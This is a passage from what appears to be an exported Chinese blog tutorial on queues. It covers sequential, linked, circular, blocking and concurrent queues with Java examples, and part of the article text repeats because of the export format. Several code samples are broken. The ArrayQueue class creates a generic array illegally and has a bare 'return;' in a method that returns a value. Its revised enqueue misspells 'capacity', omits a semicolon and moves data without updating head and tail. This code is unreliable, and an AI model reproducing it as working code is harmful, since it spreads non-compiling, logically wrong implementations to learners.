class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 基于数组实现的循环队列</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CircularQueue</span>&lt;<span class=\"title\">T</span>&gt; <span class=\"keyword\">implements</span> <span class=\"title\">Queue</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 数组items</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Object[] items;</span><br><span class=\"line\">    <span class=\"comment\">// 队列大小</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> capacity;</span><br><span class=\"line\">    <span class=\"comment\">// head表示队头下标，tail表示队尾下标</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> head=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> tail=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">CircularQueue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>(<span class=\"number\">10</span>); <span class=\"comment\">// 队列默认容量给10</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">CircularQueue</span><span class=\"params\">(<span class=\"keyword\">int</span> capacity)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.items = <span class=\"keyword\">new</span> Object[capacity];</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.capacity = capacity;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">enqueue</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((tail+<span class=\"number\">1</span>)%capacity == head)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">\"循环队列满了！\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        items[tail] = val;</span><br><span class=\"line\">        tail = (tail+<span class=\"number\">1</span>)%capacity;</span><br><span class=\"line\">        size ++;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">dequeue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (size&lt;=<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">           <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">\"空队列！\"</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       T res = (T) items[head];</span><br><span class=\"line\">       size--;</span><br><span class=\"line\">       head = (head+<span class=\"number\">1</span>)%capacity;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">toString</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Arrays.toString(items);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">size</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"阻塞队列和并发队列\"><a href=\"#阻塞队列和并发队列\" class=\"headerlink\" title=\"阻塞队列和并发队列\"></a>阻塞队列和并发队列</h3></div><br></div>\n\n<p>上面讲的都是些理论知识，看起来很难跟实际项目扯上关系，确实，队列这种数据结构很基础，平时的业务开发不大可能从零开始实现一个队列，甚至都不会直接用到。而一些具有特殊特性的队列应用却比较广泛，如阻塞队列和并发队列。</p>\n<p><strong>阻塞队列</strong>其实就是在队列基础上增加了阻塞操作。简单来说，就是在队列为空的时候，从对头取数据会被阻塞。并未此时还没有数据可取，直到队列中有了数据才能返回；如果队列已经满了，那么插入数据的操作就会被阻塞，直到队列中有空闲位置后在插入数据，然后在返回。</p>\n<img src=\"/posts/2018-09-16-算法-队列/阻塞队列.jpg\">\n<p>你应该已经发现了，上述的定义就是一个”生产者-消费者模型”！是的，我们可以用阻塞队列轻松实现一个”生产者-消费者模型”。</p>\n<p>这种基于阻塞队列实现的”生产者-消费者模型”可以有效的协调生产和消费的速度。当”生产者”生产数据的速度过快，”消费者”来不及消费时，存储数据的队列很快就会满了，这个时候，生产者就阻塞等待，直到”消费者”消费了数据，”生产者”才会被唤醒继续生产。</p>\n<p>而且不仅如此，基于阻塞队列，我们可以通过协调”生产者”和”消费者”的个数，来提高数据处理的效率。比如前面的例子，我们可以配备多个”消费者”，来对应一个”生产者”。</p>\n<img src=\"/posts/2018-09-16-算法-队列/多消费者阻塞队列.jpg\">\n<p>前面讲了阻塞队列，在多线程情况下，会有多个线程同时操作队列，这个时候就会存在线程安全问题，那如何实现一个线程安全的队列呢？</p>\n<p>线程安全的队列我们叫做<strong>并发队列</strong>。最简单直接的实现方式是直接在enqueue()、dequeue()上加锁，但是这样锁粒度大并发较低，同一时刻仅允许一个村或者取操作。实际上，基于数组的循环队列，利用CAS原子操作，可以实现非常高效的并发队列。这也是循环队列比链式队列应用更加广泛的原因。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>队列的知识讲完了，我们来看一下开篇的问题。线程池没有空闲线程时，新的任务请求线程资源时，线程池该如何处理，各种处理策略又是如何实现的呢？</p>\n<p>我们一般有两种处理策略。第一种是非阻塞的处理方式，直接拒绝任务请求；另一种是阻塞的处理方式，将请求进行排队，等到有空闲线程时，取出队列中的请求继续处理。那如何存储排队的请求呢？</p>\n<p>我们希望公平的处理每个排队的请求，先进者先出，所以队列这种数据结构很适合存储排队请求。我们前面说过，队列有基于链表和基于数组这两种方式，那这两种实现方式对于排队请求又有什么区别呢？</p>\n<p>基于链表实现的方式，可以实现一个支持无限排队的无界队列，但是可能会导致过多的请求排队等待，请求处理的响应时间过长。所以，针对响应时间较敏感的系统，基于链表实现的无限排队的线程池是不合适的。</p>\n<p>而基于数组实现的有界队列，队列的大小有限，所以线程池中排队的请求超过队列大小时，接下来的请求就会被拒绝，这种方式对响应时间敏感的系统，就相对来说比较合理。不过设置一个合适的队列大小，也是非常有讲究的。队列太大导致等待的请求太多，队列太小会导致无法充分利用系统资源，发挥最大性能。</p>\n<p>除了前面讲到的应用在线程池请求排队的场景之外，队列还可以应用在任何有限资源池中，用于排队请求，比如数据库连接池。实际上，对于大部分资源有限的场景，当没有空闲资源时，基本上都可以通过队列这种数据结构来实现队列请求排队。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天我们讲了一种跟栈很相似的数据结构，队列。</p>\n<p>队列最大的特点就是先进先出，主要的两个操作是入队和出队。跟栈一样，它既可以用数组来实现，也可以用链表来实现。用数组实现的叫顺序队列，用链表实现的叫链式队列。特别是一个长得像环一样的叫循环队列。在用数组实现的队列时，会有数据搬移的工作，要想解决数据搬移的工作，我们就需要像环一样的循环队列。</p>\n<p>循环队列是这篇的重点，要想写出没有bug的循环队列的实现代码，关键是要确定队满和队空的判定条件。</p>\n<p>除此之外，还有几种高级的数据结构，阻塞队列、并发队列，但是底层都是队列这种数据结构，只不过附加了其他的一些功能。阻塞队列就是可以对出队、入队操作进行阻塞，并发队列就是保证了多线程的队列操作线程安全。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3></div><br></div>\n\n<p>1、 除了线程池这种池结构会用到队列排队请求，你还知道那些类似的数据结构或者场景会用到队列的排队请求。</p>\n<p>如数据库的连接池、分布式应用中的消息队列（kafka、MQ）</p>\n<p>2、 关于并发队列，如何实现无锁的并发队列。</p>\n<blockquote>\n<p>提示： CAS(compare and swap) 乐观锁 悲观锁</p>\n</blockquote>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>我们知道，CPU资源是有限的，任务的处理逻辑与线程个数并不是正相关。相反，过多的线程反而会导致CPU频繁切换，处理性能下降。所以，线程池的大小一般都是综合考虑要处理任务的特点与硬件环境，来事先设置的。</p>\n<p>当我们向一个固定大小的线程池中请求一个线程时，如果线程池中没有空闲资源了，这个时候线程池如何处理这个请求？是拒绝请求还是排队请求？各种处理策略又是如何实现的？</p>\n<p>其实，这些问题并不复杂，其底层的数据结构就是今天的内容，<strong>队列(queue)</strong>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何理解队列\"><a href=\"#如何理解队列\" class=\"headerlink\" title=\"如何理解队列\"></a>如何理解队列</h3></div><br></div>\n\n<p>队列这个概念非常好理解，你可以把它想象成排队买票，先来的先买，后来的人只能站末尾，不允许插队。<strong>先进者先出，这就是典型的队列</strong>。</p>\n<p>我们知道，栈只支持两个操作：<strong>入栈push()和出栈pop()</strong>，队列和栈非常类似，支持的操作只有：<strong>入队enqueue()</strong>，将一个数据放入队尾，<strong>出队dequeue()</strong>，从队头取出一个数据。</p>\n<img src=\"/posts/2018-09-16-算法-队列/队列.jpg\">\n<p>所以，队列跟栈一样，也是一种操作受限的线性表数据结构。</p>\n<p>队列的概念很好理解，基本操作也很容易掌握。作为一种非常基础的数据结构，队列的应用也非常广泛。特别是一些具有额外特性的队列，比如循环队列、阻塞队列、并发队列。它们在很多片底层系统、框架、中间件的开发中，起着关键性的作用。比如高性能队列Disruptor、Linux环形存储，都用到了循环队列；java.concurent并发包中用到了ArrayBlockingQueue来实现公平锁等。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"顺序队列和链式队列\"><a href=\"#顺序队列和链式队列\" class=\"headerlink\" title=\"顺序队列和链式队列\"></a>顺序队列和链式队列</h3></div><br></div>\n\n<p>我们知道了，队列跟栈一样，也是一种抽象的数据结构。它具有先进先出的特性，支持在队尾插入元素，在对头删除元素，那么究竟该如何实现一个队列呢？</p>\n<p>跟栈一样，队列可以用数组实现，也可以用链表实现。用数组实现的栈叫做顺序栈，用链表实现的栈叫做链式栈。同样，用数组实现的队列叫做<strong>顺序队列</strong>，用链表实现的队列叫做<strong>链式队列</strong>。</p>\n<p>先来看下基于数组的实现方法。我这里采用java语言进行实现，不会涉及高级语法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 基于数组实现的队列</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ArrayQueue</span>&lt;<span class=\"title\">T</span>&gt;</span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 数组items</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> T[] items;</span><br><span class=\"line\">\t<span class=\"comment\">// 队列大小</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> capacity;</span><br><span class=\"line\">\t<span class=\"comment\">// head表示队头下标，tail表示队尾下标</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> head=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> tail=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayQueue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>(<span class=\"number\">10</span>); <span class=\"comment\">// 队列默认容量给10</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayQueue</span><span class=\"params\">(<span class=\"keyword\">int</span> capacity)</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>.items = <span class=\"keyword\">new</span> T[capacity];</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>.capacity = capacity;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">enqueue</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(size == capacity)&#123;<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;&#125; <span class=\"comment\">// 队列满了</span></span><br><span class=\"line\">\t\titems[tail] = val;</span><br><span class=\"line\">\t\tsize ++;</span><br><span class=\"line\">\t\ttail ++;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">dequeue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (size == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tT res = items[head];</span><br><span class=\"line\">\t\thead++;</span><br><span class=\"line\">\t\tsize--;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> res;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>比起栈的数组实现，队列的数组实现稍微有点复杂。</p>\n<p>对于栈来说，我们只需要一个栈顶指针就可以了，但是队列需要两个指针：一个head指针，指向队头；一个tail指针，指向队尾。</p>\n<p>你可以结合下面这幅图来理解。当a、b、c、d…依次入队之后，指针中的head指针指向下标为1的位置，tail指针指向下标为7的位置。</p>\n<img src=\"/posts/2018-09-16-算法-队列/示例1.jpg\">\n<p>当我们调用两次出队操作之后，队列中的head指针指向下标为5的位置，tail仍然指向下标为7的位置。</p>\n<img src=\"/posts/2018-09-16-算法-队列/示例2.jpg\">\n<p>你肯定已经发现了，随着不停的入队、出队操作，head、tail都会持续往后移动。当tail移动到最右边，即使数组中还有空闲空间，也无法继续往队列中添加数据了。这个问题如何解决呢？</p>\n<p>在数组那一节中，我们遇到过同样的问题，数组的删除操作会导致数组中的数据不连续，还记得我们怎么解决得吗？<strong>数据搬移</strong>！，但是每次出队时都相当于删除数组下标为0的数据，要搬移整个队列中的数据，这样队列的出队时间复杂度就从原来的O(1)变为了O(n)，能不能优化呢？</p>\n<p>实际上，我们在出队时可以不用搬移数据，如果没有空闲空间了，我们只需要在入队时，在集中触发一次数据的搬移操作。借助这个思想，出队函数保持不变，我们稍加改造一下入队函数enqueue()实现，就可以轻松解决刚才的问题了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">enqueue</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(size == capacity)&#123;<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;&#125; <span class=\"comment\">// 队列满了</span></span><br><span class=\"line\">\t<span class=\"comment\">// tail到尾部，队列没有满</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (tail == capactity &amp;&amp; size&lt;capacity) &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 数据搬移</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=head;i&lt;tail;i++) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// 将head到tail的数据搬移到0到size的位置</span></span><br><span class=\"line\">\t\t\titems[i-head] = items[i]</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\titems[tail] = val;</span><br><span class=\"line\">\tsize ++ ;</span><br><span class=\"line\">\ttail ++;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从代码中我们可以看到，当队列tail指针移动到数组的最右边后，且数组没有满时，如果有新的数据入队，我们可以将head-tail之间的数据，整体搬移到0-size之间的位置，</p>\n<p>这种思路中，出队的时间复杂度仍然是O(1)，但是入队的时间复杂度还是O(n)吗？此处用以前讲过的<strong>摊还分析法</strong>自行分析一下。</p>\n<p>接下来，我们看看<strong>基于链表的队列的实现方法</strong>。</p>\n<p>基于链表的实现，我们同样需要两个指针：head指针和tail指针。他们分别指向第一个结点和最后一个结点。入队时，tail-&gt;next = newNode, tail = tail-&gt;next;出队时，head = head-&gt;next。</p>\n<p>我将具体代码放到我的<a href=\"https://github.com/AriesRen/algorithm\" target=\"_blank\" rel=\"noopener\">github</a>上，有需要的可以看看。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"循环队列\"><a href=\"#循环队列\" class=\"headerlink\" title=\"循环队列\"></a>循环队列</h3></div><br></div>\n\n<p>我们上面用数组实现的队列，在tail=capacity的时候，会有数据搬移操作，这样入队操作性能就会受到影响。那有没有办法能够避免数据搬移操作呢？我们来看看循环队列的解决思路。</p>\n<p>循环队列，顾名思义，它长得像一个环。原本数组是有头有尾的，是一条直线，我们现在把首尾相连，掰成了一个环，可以通过下图直观感受一下。</p>\n<img src=\"/posts/2018-09-16-算法-队列/循环队列.jpg\">\n<p>我们可以看到，图中这个队列的大小为8，当前head=0，tail=3.当有一个新的元素d入队时，我们放入到下标为3的位置，并将tail指向4。当tail指向7，这时候再有新的元素入队时，我们并不将tail更新为8，而是将tail指向0，如果再有元素入队，放入下标为0处的位置，并将tail更新为1。当然如果head=0处没有出队的话，就说明队列满了。</p>\n<p>通过这样的方法，我们成功的避免了数据搬移操作，看起来不难理解，但是循环队列的代码实现难度要比前面讲的非循环队列难多了。要想写出没有bug的循环队列的实现代码，最关键的是，<strong>确定队列空和队列满的判定条件</strong>。</p>\n<p>在用数组实现的队列中，对空的判定条件是head==tail，队列满的条件是tail==capacity。那针对循环队列，如何判断队满和队空呢？</p>\n<p>队列为空的条件仍然是head==tail，但是队列满了的判断条件就复杂了，我画了如下一张队列满的图，可以看一下队满的规律。</p>\n<img src=\"/posts/2018-09-16-算法-队列/循环队列满.jpg\">\n<p>图中队列满时，tail=3，head=4，size=8，capacity=8，多画几张队满的图，就会发现队满时（tail+1）%capacity = head。同时，head和tail不能简单的使用++或者–，得出规律tail=(tail+1)%capacity，head=(head+1)%capacity。</p>\n<p>下面看下一下循环队列的代码：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 基于数组实现的循环队列</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CircularQueue</span>&lt;<span class=\"title\">T</span>&gt; <span class=\"keyword\">implements</span> <span class=\"title\">Queue</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 数组items</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Object[] items;</span><br><span class=\"line\">    <span class=\"comment\">// 队列大小</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> capacity;</span><br><span class=\"line\">    <span class=\"comment\">// head表示队头下标，tail表示队尾下标</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> head=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> tail=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">CircularQueue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>(<span class=\"number\">10</span>); <span class=\"comment\">// 队列默认容量给10</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">CircularQueue</span><span class=\"params\">(<span class=\"keyword\">int</span> capacity)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.items = <span class=\"keyword\">new</span> Object[capacity];</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.capacity = capacity;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">enqueue</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((tail+<span class=\"number\">1</span>)%capacity == head)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">\"循环队列满了！\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        items[tail] = val;</span><br><span class=\"line\">        tail = (tail+<span class=\"number\">1</span>)%capacity;</span><br><span class=\"line\">        size ++;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">dequeue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (size&lt;=<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">           <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">\"空队列！\"</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       T res = (T) items[head];</span><br><span class=\"line\">       size--;</span><br><span class=\"line\">       head = (head+<span class=\"number\">1</span>)%capacity;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">toString</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Arrays.toString(items);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">size</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"阻塞队列和并发队列\"><a href=\"#阻塞队列和并发队列\" class=\"headerlink\" title=\"阻塞队列和并发队列\"></a>阻塞队列和并发队列</h3></div><br></div>\n\n<p>上面讲的都是些理论知识，看起来很难跟实际项目扯上关系，确实，队列这种数据结构很基础，平时的业务开发不大可能从零开始实现一个队列，甚至都不会直接用到。而一些具有特殊特性的队列应用却比较广泛，如阻塞队列和并发队列。</p>\n<p><strong>阻塞队列</strong>其实就是在队列基础上增加了阻塞操作。简单来说，就是在队列为空的时候，从对头取数据会被阻塞。并未此时还没有数据可取，直到队列中有了数据才能返回；如果队列已经满了，那么插入数据的操作就会被阻塞，直到队列中有空闲位置后在插入数据，然后在返回。</p>\n<img src=\"/posts/2018-09-16-算法-队列/阻塞队列.jpg\">\n<p>你应该已经发现了，上述的定义就是一个”生产者-消费者模型”！是的，我们可以用阻塞队列轻松实现一个”生产者-消费者模型”。</p>\n<p>这种基于阻塞队列实现的”生产者-消费者模型”可以有效的协调生产和消费的速度。当”生产者”生产数据的速度过快，”消费者”来不及消费时，存储数据的队列很快就会满了，这个时候，生产者就阻塞等待，直到”消费者”消费了数据，”生产者”才会被唤醒继续生产。</p>\n<p>而且不仅如此，基于阻塞队列，我们可以通过协调”生产者”和”消费者”的个数，来提高数据处理的效率。比如前面的例子，我们可以配备多个”消费者”，来对应一个”生产者”。</p>\n<img src=\"/posts/2018-09-16-算法-队列/多消费者阻塞队列.jpg\">\n<p>前面讲了阻塞队列，在多线程情况下，会有多个线程同时操作队列，这个时候就会存在线程安全问题，那如何实现一个线程安全的队列呢？</p>\n<p>线程安全的队列我们叫做<strong>并发队列</strong>。最简单直接的实现方式是直接在enqueue()、dequeue()上加锁，但是这样锁粒度大并发较低，同一时刻仅允许一个村或者取操作。实际上，基于数组的循环队列，利用CAS原子操作，可以实现非常高效的并发队列。这也是循环队列比链式队列应用更加广泛的原因。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" 